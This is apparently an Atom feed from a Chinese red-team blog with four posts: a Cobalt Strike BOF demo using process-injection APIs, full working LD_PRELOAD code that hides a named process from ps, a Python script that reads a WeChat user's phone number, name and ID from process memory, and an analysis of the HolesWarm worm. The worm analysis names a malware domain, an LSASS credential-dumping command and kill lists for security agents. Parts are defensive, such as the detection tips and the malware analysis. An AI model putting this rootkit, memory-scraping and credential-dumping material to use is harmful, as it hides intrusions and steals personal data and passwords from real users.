dwCreationFlags,  LPVOID                lpEnvironment,  LPCSTR                lpCurrentDirectory,  LPSTARTUPINFOA        lpStartupInfo,  LPPROCESS_INFORMATION lpProcessInformation);</code></pre><p>更多示例</p><pre><code>DECLSPEC_IMPORT WINBASEAPI void * __cdecl MSVCRT$memset(void *_Dst,int _Val,size_t _Size);DECLSPEC_IMPORT WINBASEAPI WINBOOL WINAPI KERNEL32$CreateProcessA (LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, WINBOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);DECLSPEC_IMPORT WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAllocEx (HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);DECLSPEC_IMPORT WINBASEAPI WINBOOL WINAPI KERNEL32$WriteProcessMemory (HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$QueueUserAPC (PAPCFUNC pfnAPC, HANDLE hThread, ULONG_PTR dwData);DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$ResumeThread (HANDLE hThread);</code></pre><p>demo2.c （无参数，windows API调用）</p><pre><code class="C">#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include &lt;tlhelp32.h&gt;#include &quot;beacon.h&quot;DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$CreateProcessA(  LPCSTR                lpApplicationName,  LPSTR                 lpCommandLine,  LPSECURITY_ATTRIBUTES lpProcessAttributes,  LPSECURITY_ATTRIBUTES lpThreadAttributes,  BOOL                  bInheritHandles,  DWORD                 dwCreationFlags,  LPVOID                lpEnvironment,  LPCSTR                lpCurrentDirectory,  LPSTARTUPINFOA        lpStartupInfo,  LPPROCESS_INFORMATION lpProcessInformation);void demo(char * args, int length) {    STARTUPINFOA si = { 0 };    si.cb = sizeof(si);    PROCESS_INFORMATION pi = { 0 };    BOOL Test = KERNEL32$CreateProcessA(NULL, &quot;C:\\Windows\\System32\\notepad.exe&quot;, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &amp;si, &amp;pi);}</code></pre><p>demo.cna</p><pre><code>alias hello {    btask($1, script_resource(&quot;demo2.o&quot;));    $handle = openf(script_resource(&quot;demo2.o&quot;));    $data   = readb($handle, -1);    closef($handle);    $args = bof_pack($1, &quot;zi&quot;, &quot;&quot;, 0);    btask($1, &quot;Running Hello BOF&quot;);    beacon_inline_execute($1, $data, &quot;demo&quot;, $args);}</code></pre><p><img src="https://z3.ax1x.com/2021/07/28/W7yv90.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cobaltstrike.com/help-beacon-object-files" target="_blank" rel="noopener">https://www.cobaltstrike.com/help-beacon-object-files</a><br><a href="https://www.cobaltstrike.com/aggressor-script/functions.html" target="_blank" rel="noopener">https://www.cobaltstrike.com/aggressor-script/functions.html</a><br><a href="http://evilash.me/2020/08/18/BOF.html" target="_blank" rel="noopener">http://evilash.me/2020/08/18/BOF.html</a><br><a href="https://github.com/boku7/HOLLOW/blob/main/hollow.x64.c" target="_blank" rel="noopener">https://github.com/boku7/HOLLOW/blob/main/hollow.x64.c</a> - 这个例子不错</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;BOF介绍&quot;&gt;&lt;a href=&quot;#BOF介绍&quot; class=&quot;headerlink&quot; title=&quot;BOF介绍&quot;&gt;&lt;/a&gt;BOF介绍&lt;/h2&gt;&lt;p&gt;信标对象文件 (BOF) 是一个已编译的 C 程序，按照约定编写，允许它在信标进程中执行并使用内部信标 API。BO</summary>
      
    
    
    
    
    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
    
  </entry>
  
  <entry>
    <title>Linux 通过LD_PRELOAD实现进程隐藏</title>
    <link href="http://422926799.github.io/posts/906527f2.html"/>
    <id>http://422926799.github.io/posts/906527f2.html</id>
    <published>2021-07-26T09:20:12.000Z</published>
    <updated>2021-07-26T10:13:28.808Z</updated>
    
    <content type="html"><![CDATA[<h2 id="LD-PRELOAD介绍"><a href="#LD-PRELOAD介绍" class="headerlink" title="LD_PRELOAD介绍"></a>LD_PRELOAD介绍</h2><p>好问题！实际上，/etc/ld.so.preload在某种程度上取代了LD_PRELOAD。<br>由于安全问题，LD_PRELOAD受到严格限制：它不能执行任意setuid二进制文件，因为如果可以，您可以用您自己的恶意代码替换库例程，例如参见此处的一个很好的讨论。事实上，你可以在ld.so’user manual 中阅读：</p><blockquote><p>LD_PRELOAD 要在所有其他库之前加载的附加、用户指定的 ELF 共享库列表。列表的项目可以用空格或冒号分隔。这可用于选择性地覆盖其他共享库中的函数。使用描述下给出的规则搜索库。对于 set-user-ID/set-group-ID ELF 二进制文件，包含斜杠的预加载路径名将被忽略，并且只有在库文件上启用了 set-user-ID 权限位时才会加载标准搜索目录中的库。<br>相反，文件/etc/ld.so.preload没有这样的限制，这个想法是，如果你可以读/写目录/etc，你已经拥有 root 凭据。因此它的使用。请记住，您可以使用/etc/ld.so.preload即使您一开始似乎没有：它只是glibc 的一个特性，因此是所有 Linux 发行版的一个特性（但不是，最好的我对 Unix 风格的了解），因此您可以创建它并将任何Linux 发行版中的任何setuid 库的名称放入其中，它就会起作用。</p></blockquote><h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><p><img src="https://z3.ax1x.com/2021/07/26/WfYGh6.png" alt=""><br>（也不知道这两个函数怎么知道是系统调用抽出来的）</p><p>ps命令获取进程过程：</p><pre><code>* openat打开/proc/&lt;pid&gt;/&lt;file&gt;* read读取* write输出</code></pre><p>通过执行<code>strace -f ps -elf 2&gt;&amp;1</code>即可得出结论<br><img src="https://z3.ax1x.com/2021/07/26/WfYo40.png" alt=""></p><p>上面那个github的原理就是hook了readdir。github上面那个通过利用循环里的continue跳过匹配的进程返回，但是会造成bug，稍微修改了一下，最终结果如下</p><pre><code class="C">#define _GNU_SOURCE#include &lt;dirent.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;dlfcn.h&gt;#include &lt;unistd.h&gt;static int get_dir_name(DIR* dirp, char* buf, size_t size){    int fd = dirfd(dirp); //获取目录流文件描述符    if(fd == -1) {        return 0;    }    char tmp[64];    snprintf(tmp, sizeof(tmp), &quot;/proc/self/fd/%d&quot;, fd); //拼接路径得到目录流文件路径    ssize_t ret = readlink(tmp, buf, size); //读取符号链接的值 (读取链接的目录)    if(ret == -1) {        return 0;    }    buf[ret] = 0;    return 1;}static int get_process_name(char* pid, char* buf){    if(strspn(pid, &quot;0123456789&quot;) != strlen(pid)) { //枚举出PID目录        return 0;    }    char tmp[256];    snprintf(tmp, sizeof(tmp), &quot;/proc/%s/stat&quot;, pid); //拼接得到/porc/&lt;pid&gt;/stat文件路径    FILE* f = fopen(tmp, &quot;r&quot;);    if(f == NULL) {        return 0;    }    if(fgets(tmp, sizeof(tmp), f) == NULL) {        fclose(f);        return 0;    }    fclose(f);    int unused;    sscanf(tmp, &quot;%d (%[^)]s&quot;, &amp;unused, buf); //读取完/porc/&lt;pid&gt;/stat文件内容匹配出进程名称    return 1;}static struct dirent* (*original_readdir)(DIR*) = NULL; //构造readdir函数原型 https://linux.die.net/man/3/readdirstatic const char* process_to_filter = &quot;ruby&quot;; //需要被隐藏的进程名称struct dirent *readdir(DIR *dirp){        if(original_readdir == NULL) {                original_readdir = dlsym(RTLD_NEXT, &quot;readdir&quot;); //通过dlsym来获取readdir函数地址                if(original_readdir==NULL){                        printf(&quot;readdir Address Get Failure,Error Code:%d\n&quot;,dlerror());                }        }        struct dirent* dp;        dp=original_readdir(dirp); //通过调用readdir函数读取目录        char dirname[256];        char processname[256];        get_dir_name(dirp,dirname,sizeof(dirname)); //获取当前所在目录        if(strcmp(dirname,&quot;/proc&quot;)==0){ //目录文件等于/proc                get_process_name(dp-&gt;d_name,processname);  //由于目录文件是/proc，那么文件名(d_name)肯定是pid，所以获取要打开的文件名                if(strcmp(processname,process_to_filter)==0){ //当进程名称符合要屏蔽的进程名不返回                }else{                        return dp;                }        }}</code></pre><p>while循环continue屏蔽</p><pre><code class="C">#define _GNU_SOURCE#include &lt;dirent.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;dlfcn.h&gt;#include &lt;unistd.h&gt;static int get_dir_name(DIR* dirp, char* buf, size_t size){    int fd = dirfd(dirp);    if(fd == -1) {        return 0;    }    char tmp[64];    snprintf(tmp, sizeof(tmp), &quot;/proc/self/fd/%d&quot;, fd);    ssize_t ret = readlink(tmp, buf, size);    if(ret == -1) {        return 0;    }    buf[ret] = 0;    return 1;}static int get_process_name(char* pid, char* buf){    if(strspn(pid, &quot;0123456789&quot;) != strlen(pid)) {        return 0;    }    char tmp[256];    snprintf(tmp, sizeof(tmp), &quot;/proc/%s/stat&quot;, pid);    FILE* f = fopen(tmp, &quot;r&quot;);    if(f == NULL) {        return 0;    }    if(fgets(tmp, sizeof(tmp), f) == NULL) {        fclose(f);        return 0;    }    fclose(f);    int unused;    sscanf(tmp, &quot;%d (%[^)]s&quot;, &amp;unused, buf);    return 1;}#define DECLARE_READDIR(dirent, readdir)static struct dirent* (*original_readdir)(DIR*) = NULL;static const char* process_to_filter = &quot;ruby&quot;;struct dirent *readdir(DIR *dirp){        if(original_readdir == NULL) {                original_readdir = dlsym(RTLD_NEXT, &quot;readdir&quot;);                if(original_readdir==NULL){                        printf(&quot;readdir Address Get Failure,Error Code:%d\n&quot;,dlerror());                }        }        struct dirent* dp;        while(1){                dp=original_readdir(dirp);                char dirname[256];                char processname[256];                get_dir_name(dirp,dirname,sizeof(dirname));                if(strcmp(dirname,&quot;/proc&quot;)==0){                        get_process_name(dp-&gt;d_name,processname);                        if(strcmp(processname,process_to_filter)==0){                                continue;                        }                }                break;        }        return dp;}</code></pre><p>静态编译:<br><code>gcc -shared -fpic example.c -o example.so</code><br><code>LD_PRELOAD=/home/kali/Desktop/example.so /usr/bin/ps -elf</code> #指定程序使用</p><p>从这些code里面可以明白写LD HOOK的时候，需准备以下操作：</p><pre><code>* 被HOOK的目标函数是否通过libc抽象出来调用的，比如说getuid这种就不是。C原生的，非C原生的都要HOOK C原生函数* 实例化被HOOK函数原型* 通过dlsym寻找被HOOK原函数的地址，赋予定义的函数原型变量* 调用原函数获取内容，判断后是否要return</code></pre><p>PS:最好还是用while continue屏蔽</p><p><img src="https://z3.ax1x.com/2021/07/26/Wftm5t.png" alt=""></p><h2 id="etc-ld-so-preload测试的问题"><a href="#etc-ld-so-preload测试的问题" class="headerlink" title="/etc/ld.so.preload测试的问题"></a>/etc/ld.so.preload测试的问题</h2><p>使用了/etc/ld.so.preload (最好不要用，由于是全局使用容易出现大规模的问题) -&gt; 匹配到不是进程名称的就return返回<br><img src="https://z3.ax1x.com/2021/07/26/WftBMF.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/26/WfsYOx.png" alt=""><br>（测试遇到这个问题先删除so，在删除/etc/ld.so.preload）</p><p>while循环continue虽然可以避免这个问题，但是执行ps的时候会出现bug<br><img src="https://z3.ax1x.com/2021/07/26/WfswkD.png" alt=""></p><p>防止这种操作蒙蔽双眼：<br>I、检查LD_PRELOAD环境变量是否有异常<br>II、检查ld.so.preload 等配置文件是否有异常<br>III、自己写个python小工具，直接读取/proc中的内容，对于ps等工具的结果，对不上，则存在被劫持可能<br>IV、使用sysdig（有开源版，可以监控ps等的调用过程，观察是否有恶意动态库被加载。strace有类似功能）或者prochunter（google 上search）<br>sysdig proc.name=ps or strace -f ps -elf 2&gt;&amp;1</p><p>遍历/poc目录，获取进程PID。读取/proc/<pid>/stat文件 -&gt; 读取/proc/<pid>/cmdline得到要执行的命令行参数</pid></pid></p><pre><code class="python">import osdef getprocess():    path=os.listdir(&quot;/proc&quot;)    for p in path:        tmplen=0        for n in range(0,10):            for c in p:                if c==str(n):                    tmplen+=1        if len(p)==tmplen:            print(&quot;------PID:{}-----&quot;.format(p))            print(open(&quot;/proc/{}/stat&quot;.format(p),&quot;r&quot;).read())            print(open(&quot;/proc/{}/cmdline&quot;.format(p),&quot;r&quot;).read())getprocess()</code></pre><p><img src="https://z3.ax1x.com/2021/07/26/WfaEb4.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://linux.die.net/man/3/readdir" target="_blank" rel="noopener">https://linux.die.net/man/3/readdir</a><br><a href="https://pubs.opengroup.org/onlinepubs/007904875/functions/readdir_r.html" target="_blank" rel="noopener">https://pubs.opengroup.org/onlinepubs/007904875/functions/readdir_r.html</a><br><a href="https://techoverflow.net/2019/06/20/how-to-fix-c-error-rtld_next-undeclared/" target="_blank" rel="noopener">https://techoverflow.net/2019/06/20/how-to-fix-c-error-rtld_next-undeclared/</a><br><a href="https://sysdig.com/blog/hiding-linux-processes-for-fun-and-profit/" target="_blank" rel="noopener">https://sysdig.com/blog/hiding-linux-processes-for-fun-and-profit/</a><br><a href="https://github.com/gianlucaborello/libprocesshider" target="_blank" rel="noopener">https://github.com/gianlucaborello/libprocesshider</a><br>现成工具:<a href="https://github.com/gianlucaborello/libprocesshider" target="_blank" rel="noopener">https://github.com/gianlucaborello/libprocesshider</a><br>原理文章:<a href="https://sysdig.com/blog/hiding-linux-processes-for-fun-and-profit/" target="_blank" rel="noopener">https://sysdig.com/blog/hiding-linux-processes-for-fun-and-profit/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;LD-PRELOAD介绍&quot;&gt;&lt;a href=&quot;#LD-PRELOAD介绍&quot; class=&quot;headerlink&quot; title=&quot;LD_PRELOAD介绍&quot;&gt;&lt;/a&gt;LD_PRELOAD介绍&lt;/h2&gt;&lt;p&gt;好问题！实际上，/etc/ld.so.preload在某种程</summary>
      
    
    
    
    
    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
    
  </entry>
  
  <entry>
    <title>读取微信内存里的信息</title>
    <link href="http://422926799.github.io/posts/26c63b49.html"/>
    <id>http://422926799.github.io/posts/26c63b49.html</id>
    <published>2021-07-20T16:34:51.000Z</published>
    <updated>2021-07-20T16:55:42.790Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>参考链接:<a href="https://blog.csdn.net/weixin_30230009/article/details/105100181" target="_blank" rel="noopener">https://blog.csdn.net/weixin_30230009/article/details/105100181</a><br>需要了解知识：<br>基址 -&gt; 基址在程序下次运行时是不会改变的<br>-&gt;每次重启进程，模块加载的地址会变</p><h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><p>寻找对应的信息基本方法如下:<br>打开CE附加微信进程，搜索微信号等关键字，然后找到基址 （绿色的就是），双击添加到地址列表<br><img src="https://z3.ax1x.com/2021/07/21/WU1snP.png" alt=""></p><p>PS：这里重启了几次wx，所以CE里的地址和上图对不上 (一开始忘记截了)<br>对着地址双击就能看到对应的地址<br><img src="https://z3.ax1x.com/2021/07/21/WU1y0f.png" alt=""></p><p>然后OD定位到对应的内存地址去查询<br>command: dd <address><br>可以看到开头就是微信号 （打码的手机号）等信息<br><img src="https://z3.ax1x.com/2021/07/21/WU1678.png" alt=""></address></p><p>我们只需要知道基址然后：模块加载地址+基址</p><p>怎么求基址-&gt;偏移地址-dll加载地址=基址<br>这里求手机号基址为例，在od鼠标在内存窗口单机刚刚找到的那个地址点击手机号第一个数字，然后记录下地址，在CE手动添加地址里面输入，类型选字符串<br>即可看见手机号（手机号长度11所以长度设置11）<br><img src="https://z3.ax1x.com/2021/07/21/WU1h1s.png" alt=""></p><p>dll加载地址，CE点击手动添加地址，输入dll名称，类型选4字节<br><img src="https://z3.ax1x.com/2021/07/21/WU15Xq.png" alt=""></p><p>然后将数值改为十六进制（即可得到地址）<br><img src="https://z3.ax1x.com/2021/07/21/WU1TBV.png" alt=""></p><p>或者你也可以用OD或者Process Explorer里获取加载dll地址<br>（注：这后面截的图与上方地址对不上）<br><img src="https://z3.ax1x.com/2021/07/21/WU177T.png" alt=""></p><p>求出手机号基址<br>53D0F560:手机号内存地址<br>52CC0000:dll加载地址<br>53D0F560-52CC0000=104F560 -&gt; WeChatWin.dll(52CC0000)+104F560=手机号<br><img src="https://z3.ax1x.com/2021/07/21/WU1qNF.png" alt=""></p><p>所以以此类推获取：微信号、微信名称等基址<br>WeChatWin.dll+104F52C - wx名<br>WeChatWin.dll+104F690 - wx号地址<br>WeChatWin.dll+104F560 - 手机号</p><p>（找到信息的时候可以切成地址，然后往下滑）<br><img src="https://z3.ax1x.com/2021/07/21/WU1X9J.png" alt=""></p><p>注意事项：遇到指针的话，先获取指针里的值。然后在用这个值当作地址找<br>在找wx号的时候就遇到了<br>（算出第一个基址后，求别的时候只需要把后面三个数字给替换掉就知道了,emmmmmm）<br><img src="https://z3.ax1x.com/2021/07/21/WU1vcR.png" alt=""></p><p>此时046F35D0里面的地址放着微信号<br>（PS:这里地址微信重启过，和上面的图地址对不上）<br><img src="https://z3.ax1x.com/2021/07/21/WU3Snx.png" alt=""></p><p>构造读取<br>使用的Windows API:OpenProcess、ReadProcessMemory</p><pre><code class="python">from ctypes import *from win32con import *from ctypes.wintypes import *from win32process import (EnumProcessModules,GetModuleFileNameEx)import osCreateToolhelp32Snapshot=windll.Kernel32.CreateToolhelp32SnapshotProcess32First=windll.kernel32.Process32FirstProcess32Next=windll.kernel32.Process32NextOpenProcess = windll.kernel32.OpenProcessReadProcessMemory = windll.kernel32.ReadProcessMemoryCloseHandle = windll.kernel32.CloseHandleTH32CS_SNAPPROCESS=0x00000002TH32CS_SNAPMODULE = 0x00000008MAX_MODULE_NAME32 = 255class PROCESSENTRY32A(Structure): #定义PROCESSENTRY32A类型    _fields_ = [ ( &#39;dwSize&#39; , c_ulong ) ,                 ( &#39;cntUsage&#39; , c_ulong) ,                 ( &#39;th32ProcessID&#39; , c_ulong) ,                 ( &#39;th32DefaultHeapID&#39; , c_size_t) ,                 ( &#39;th32ModuleID&#39; , c_ulong) ,                 ( &#39;cntThreads&#39; , c_ulong) ,                 ( &#39;th32ParentProcessID&#39; , c_ulong) ,                 ( &#39;pcPriClassBase&#39; , c_long) ,                 ( &#39;dwFlags&#39; , c_ulong) ,                 ( &#39;szExeFile&#39; , c_char * MAX_PATH ) ]def getprocess_pid(processname):    processimage=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0)    pe32=PROCESSENTRY32A()    pe32.dwSize=sizeof(PROCESSENTRY32A)    ret=Process32First(processimage,pointer(pe32))    while ret:        if pe32.szExeFile.decode()==processname:            return pe32.th32ProcessID        ret=Process32Next(processimage,pointer(pe32))def getmodule_address(handle,dllname):    for module in EnumProcessModules(handle):        dllpath=GetModuleFileNameEx(handle,module)        print(module,dllpath)def main():    wetchatwindlladdress=0x63B60000 #枚举WetChatWin.dll加载地址失败，就直接手动定义了    phome = create_string_buffer(11)    wxname=create_string_buffer(20)    wxnumber=c_int(20)    number=create_string_buffer(20)    pid=getprocess_pid(&quot;WeChatStore.exe&quot;)    print(&quot;WeChat PID:{}&quot;.format(pid))    process=OpenProcess(PROCESS_ALL_ACCESS,False,pid)    ReadProcessMemory(process,wetchatwindlladdress+0x104F560,byref(phome),11,None)    ReadProcessMemory(process,wetchatwindlladdress+0x104F52C,byref(wxname),20,None)    ReadProcessMemory(process,wetchatwindlladdress+0x104F690,byref(wxnumber),20,None)    print(&quot;WX Phome:&quot;+hex(wetchatwindlladdress + 0x104F560),phome.value.decode())    print(&quot;WX Name:&quot;+hex(wetchatwindlladdress+0x104F52C),wxname.value.decode())    wxnumberaddress=wxnumber.value #可以不用转十六进制，直接十进制即可,py转十六进制默认是str类型。。hex函数转后填进地址读不到    ReadProcessMemory(process,wxnumberaddress,byref(number),20,None)    print(&quot;WX Number:&quot;+number.value.decode())    #getmodule_address(handle,&quot;WeChatWin.dll&quot;)if __name__ == &#39;__main__&#39;:    main()</code></pre><p><img src="https://z3.ax1x.com/2021/07/21/WU3PAO.png" alt=""></p><p>踩坑记录：</p><pre><code>* 调用EnumProcess和用Thread32First枚举模块，结果根本不能完全枚举。原本想模仿Process Explorer调用ZwQueryVirtualMemory函数枚举模块，py写起来太麻烦。。算了</code></pre><p>这种方法也可以用来干别</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;参考链接:&lt;a href=&quot;https://blog.csdn.net/weixin_30230009/article/details/10</summary>
      
    
    
    
    
    <category term="Writing" scheme="http://422926799.github.io/tags/Writing/"/>
    
  </entry>
  
  <entry>
    <title>HolesWarm蠕虫简陋分析</title>
    <link href="http://422926799.github.io/posts/1d42cb0b.html"/>
    <id>http://422926799.github.io/posts/1d42cb0b.html</id>
    <published>2021-07-18T19:04:48.000Z</published>
    <updated>2021-07-18T19:34:45.407Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>参考链接：<a href="https://mp.weixin.qq.com/s?__biz=MzI5ODk3OTM1Ng==&amp;mid=2247498990&amp;idx=1&amp;sn=7a5267d7158760ebaa01a2df690c70e1&amp;chksm=ec9f259ddbe8ac8bd58c7457e66fc19f3dbe89c5f9c968270ac45ffcdcf1ad9b9dcfa1944819&amp;mpshare=1&amp;scene=1&amp;srcid=0712At1VR9Ff5MIVXuq74JU5&amp;sharer_sharetime=1626082528152&amp;sharer_shareid=2119bd962d3dda0ad51c960f2c4e01ca#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI5ODk3OTM1Ng==&amp;mid=2247498990&amp;idx=1&amp;sn=7a5267d7158760ebaa01a2df690c70e1&amp;chksm=ec9f259ddbe8ac8bd58c7457e66fc19f3dbe89c5f9c968270ac45ffcdcf1ad9b9dcfa1944819&amp;mpshare=1&amp;scene=1&amp;srcid=0712At1VR9Ff5MIVXuq74JU5&amp;sharer_sharetime=1626082528152&amp;sharer_shareid=2119bd962d3dda0ad51c960f2c4e01ca#rd</a><br>PS：大部分二进制文件都是golang写的</p><p>攻击模块配置信息:<a href="http://m.windowsupdatesupport.org/d/windowsupdatev1.json" target="_blank" rel="noopener">http://m.windowsupdatesupport.org/d/windowsupdatev1.json</a><br><img src="https://i.bmp.ovh/imgs/2021/07/d40a5da968266f64.png" alt=""></p><h2 id="download"><a href="#download" class="headerlink" title="download"></a>download</h2><p>download - md5：423d3ade2f14572c5bd5f546973eb493<br>编写语言:VC++<br><img src="https://i.bmp.ovh/imgs/2021/07/853a3fc9e0eaf244.png" alt=""></p><p>如果加载crt运行库失败进入反调试判断<br>这玩意啥事没干，创建UID然后HOOK和设置窗口的<br><img src="https://i.bmp.ovh/imgs/2021/07/f119fe0052fb76b6.png" alt=""></p><p>沙箱全绿，啥危险动作也没有：<a href="https://www.hybrid-analysis.com/sample/a1dfbac053d9f93dc80792388d210a13b2f9fb69c15dacbf59e9043ea4e8afaf/5fff0d7940bcf316d078c719" target="_blank" rel="noopener">https://www.hybrid-analysis.com/sample/a1dfbac053d9f93dc80792388d210a13b2f9fb69c15dacbf59e9043ea4e8afaf/5fff0d7940bcf316d078c719</a><br>定性为混淆视听用的 (一本正经胡说八道</p><h2 id="dbus和updater-exe"><a href="#dbus和updater-exe" class="headerlink" title="dbus和updater.exe"></a>dbus和updater.exe</h2><p>xmr挖矿<br><img src="https://i.bmp.ovh/imgs/2021/07/143f344b34ab9ea9.png" alt=""></p><p><img src="https://i.bmp.ovh/imgs/2021/07/2b14c3fc76c5c4b9.png" alt=""></p><h2 id="sshkey-sh"><a href="#sshkey-sh" class="headerlink" title="sshkey.sh"></a>sshkey.sh</h2><p>杀死带有hashvault.pro,nanopool.org,minexmr.com,/boot/efi/,supportxmr.com,xmrpool.net,minergate.com,viaxmr.com,hwlh3wlh44lh,Circle_MI,get.bi-chi.com,hashvault.pro,nanopool.org,/usr/bin/.sshd,/usr/bin/bsd-port,xmr,xig,ddgs,qW3xT,wnTKYg,t00ls.ru,sustes,thisxxs,hashfish,kworkerds关键字的进程<br>从被沦陷的机器里收集ssh私钥、正在连接到当前机器的ssh IP、ssh port、非0.0.0.0和本机的IP、遍历尝试连接执行命令<br><img src="https://i.bmp.ovh/imgs/2021/07/95b307c837970d3b.png" alt=""></p><h2 id="loader-sh"><a href="#loader-sh" class="headerlink" title="loader.sh"></a>loader.sh</h2><p>loader.sh - md5:28d790d6a9172f3c59df117f00af7755<br>删除或杀死带有aegis,hids,cloudwalker,titanagent,edr,aegis,Yun,hids,edr,cloudwalker,titanagent,sgagent,barad_agent,hostguard关键字的进程/进程所在目录,创建.git目录,下载kworkers到.git目录里后台运行，删除带有m.windowsupdatesupport.org关键字的命令历史记录<br><img src="https://i.bmp.ovh/imgs/2021/07/714b29205612fc41.png" alt=""></p><h2 id="hideproc-sh"><a href="#hideproc-sh" class="headerlink" title="hideproc.sh"></a>hideproc.sh</h2><p>hideproc.sh - md5:27b704633d578c44fefffa2e3ac026ae<br>为了隐藏进程，如果当前权限是root权限，检查/etc/ld.so.preload是否存在关键字libc2.28，远程下载processhider.c编译好后移动至/usr/local/lib/<br><img src="https://i.bmp.ovh/imgs/2021/07/242284e33e57d303.png" alt=""></p><p>processhider用的github上开源的<br><a href="https://github.com/gianlucaborello/libprocesshider/blob/master/processhider.c" target="_blank" rel="noopener">https://github.com/gianlucaborello/libprocesshider/blob/master/processhider.c</a><br><a href="https://sysdig.com/blog/hiding-linux-processes-for-fun-and-profit/" target="_blank" rel="noopener">https://sysdig.com/blog/hiding-linux-processes-for-fun-and-profit/</a></p><h2 id="loader-ps1"><a href="#loader-ps1" class="headerlink" title="loader.ps1"></a>loader.ps1</h2><p>loader.ps1 - md5:35429fa2dacf4f52188cfd59f994fd91<br>创建.git文件夹,检查当前目录下是否存在.git文件夹。如果存在附加隐藏属性，下载service到.git文件夹。如果当前目录不存在.git文件夹，就在C:\Windows\Temp文件夹，重复上面的步骤<br><img src="https://i.bmp.ovh/imgs/2021/07/413e938baccda7bb.png" alt=""></p><h2 id="service-exe"><a href="#service-exe" class="headerlink" title="service.exe"></a>service.exe</h2><p>service.exe - md5:b5e5cd56703fbda95accbb8528131da4<br>VT：<a href="https://www.virustotal.com/gui/file/a572e2f1acc9151928b0fc0a69e1cc2b18bb8884aaa7fcf4bfff53706ab447d1/detection" target="_blank" rel="noopener">https://www.virustotal.com/gui/file/a572e2f1acc9151928b0fc0a69e1cc2b18bb8884aaa7fcf4bfff53706ab447d1/detection</a></p><blockquote><p>释放procedump尝试dump系统lsass.exe进程（procdump.exe -accepteula -ma lsass.exe C:*/1.dmp），再打包上传，其意图为通过dump LSASS进程，窃取内存数据，再结合其它方法（例如Mimikatz）以破解失陷系统的明文密码，以便进一步对失陷网络的其它计算机进行入侵渗透活动。</p></blockquote><p><img src="https://i.bmp.ovh/imgs/2021/07/a0c67f1d34f97330.png" alt=""><br><img src="https://i.loli.net/2021/07/19/4mdgxGX2Yuc9b6r.png" alt=""></p><p>golang开发的<br><img src="https://i.loli.net/2021/07/19/c12ifCtaOjRVqwS.png" alt=""><br>找不到入口点（没见到main_main）<br>只能靠沙盒了</p><h2 id="autoupdate-exe"><a href="#autoupdate-exe" class="headerlink" title="autoupdate.exe"></a>autoupdate.exe</h2><p>autoupdate.exe - md5:93b797b32df3a0f15d1d9c78749aa918<br>加了UPX壳，同样是golang开发的<br><img src="https://i.loli.net/2021/07/19/SU2kBzhCrgMnYuw.png" alt=""><br><img src="https://i.loli.net/2021/07/19/DjU4mYeoWv1F5KA.png" alt=""></p><p>获取远程要攻击的IP段，和本地机器的IP段。进行web漏洞尝试<br><img src="https://i.loli.net/2021/07/19/3EZip2FucfI5dXB.png" alt=""><br><img src="https://i.loli.net/2021/07/19/gd3EPoMnG6pKWhc.png" alt=""></p><p>进行以下exp尝试</p><pre><code>* 用友bsh.servlet.BshServlet 命令执行攻击* 用友GRP-U8注入-命令执行攻击* 泛微OA E-cology Bsh 命令执行攻击* 致远OA htmlofficeservlet任意文件写入攻击* 致远OA-ajax.do文件上传漏洞攻击* 致远OA-fajson漏洞* Docker未授权命令执行攻击* Jenkins 未授权命令执行攻击* Tomcat 爆破攻击* Weblogic RCE远程执行攻击( CVE-2020-14882)* Spring boot actuator RCE* Shiro 反序列化 RCE* Struts2全系列（s008-s057）的漏洞利用攻击</code></pre><p>…….等等<br><img src="https://i.loli.net/2021/07/19/4ZSFob1LsVpYWHz.png" alt=""></p><h2 id="inj-exe"><a href="#inj-exe" class="headerlink" title="inj.exe"></a>inj.exe</h2><p>inj.exe - md5:46171ccf2302e01fa6cb0a97e081a885<br>进程注射器<br><img src="https://i.loli.net/2021/07/19/dME3pztrLhGv1Xb.png" alt=""></p><h2 id="runtime-dll"><a href="#runtime-dll" class="headerlink" title="runtime.dll"></a>runtime.dll</h2><p>runtime.dll - md5:c6cf950a65df9ebfaf78cfa86f6788db<br>对NtQuerySystemInfomation进行hook，最终实现Windows平台下的恶意模块进程的隐藏。<br><img src="https://i.loli.net/2021/07/19/lH6IMhnVkLUpDva.png" alt=""><br><img src="https://i.loli.net/2021/07/19/IyhkzO29oBLTYZ3.png" alt=""></p><p>URL :<a 